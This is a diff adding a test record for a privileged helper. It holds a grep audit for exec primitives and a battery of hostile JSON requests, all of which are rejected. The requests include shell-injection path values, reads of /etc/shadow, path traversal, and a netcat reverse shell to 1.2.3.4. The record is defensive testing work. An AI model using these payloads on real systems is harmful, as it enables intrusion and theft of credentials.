@@ -1,0 +1,25 @@
+# T6 — prove the helper cannot be made to execute anything.
+# Method 1: strace every execve/execveat of the helper and its descendants
+#           while a hostile request battery is thrown at it.
+# Method 2: source audit of the crate.
+
+## source audit: command-execution primitives
+$ grep -rnE "execv|execve|system\\(|popen|posix_spawn|fork\\(|Command::new" src/
+  src/bin/helper.rs:16://!  R7 no `fork`, no `exec`, no `system`, no `posix_spawn` anywhere in the crate.
+
+## strace-wrapped run
+# : an unmatched-close check follows
+
+## hostile battery — every entry tries to reach a shell or a file
+  {"opcode":1,"args":{"cmd":"id"}}                           -> {"ok":false,"opcode":"Describe","code":"arg_unexpected","message":"Describe takes no arguments"}
+  {"opcode":1,"args":{"exec":"/bin/sh -c id"}}               -> {"ok":false,"opcode":"Describe","code":"arg_unexpected","message":"Describe takes no arguments"}
+  {"opcode":2,"args":{"path":"; id; cat /etc/shadow"}}       -> {"ok":false,"opcode":"StatPath","code":"path_invalid","message":"path rejected by the lexical whitelist"}
+  {"opcode":2,"args":{"path":"$(cat /etc/shadow)"}}          -> {"ok":false,"opcode":"StatPath","code":"path_invalid","message":"path rejected by the lexical whitelist"}
+  {"opcode":2,"args":{"path":"`id`"}}                        -> {"ok":false,"opcode":"StatPath","code":"path_invalid","message":"path rejected by the lexical whitelist"}
+  {"opcode":2,"args":{"path":"x|nc -e /bin/sh 1.2.3.4 9"}}   -> {"ok":false,"opcode":"StatPath","code":"path_invalid","message":"path rejected by the lexical whitelist"}
+  {"opcode":"shell","args":{"argv":["id"]}}                  -> {"ok":false,"opcode":"<none>","code":"bad_opcode","message":"opcode must be numeric, not a string"}
+  {"opcode":3,"args":{"path":"../../../../etc/shadow"}}      -> {"ok":false,"opcode":"ReadSmall","code":"path_escape","message":"path escapes the permitted root"}
+  {"opcode":4,"args":{"path":"/root"}}                       -> {"ok":false,"opcode":"ListDir","code":"path_escape","message":"path escapes the permitted root"}
+  {"opcode":90,"args":{"subvol":"/"}}                        -> {"ok":false,"opcode":"BtrfsSnapshot","code":"not_implemented_by_design","message":"opcode exists in the table but is intentionally not implemented"}
+  {"opcode":2,"args":{"path":"p.txt","cmd":"sh -c id"}}      -> {"ok":false,"opcode":"StatPath","code":"arg_unexpected","message":"only `path` is accepted for this opcode"}
+  {"opcode":2,"path":"AAAA...(8000)"}                        -> {"ok":false,"opcode":"StatPath","code":"arg_too_large","message":"missing or oversized `path`"}
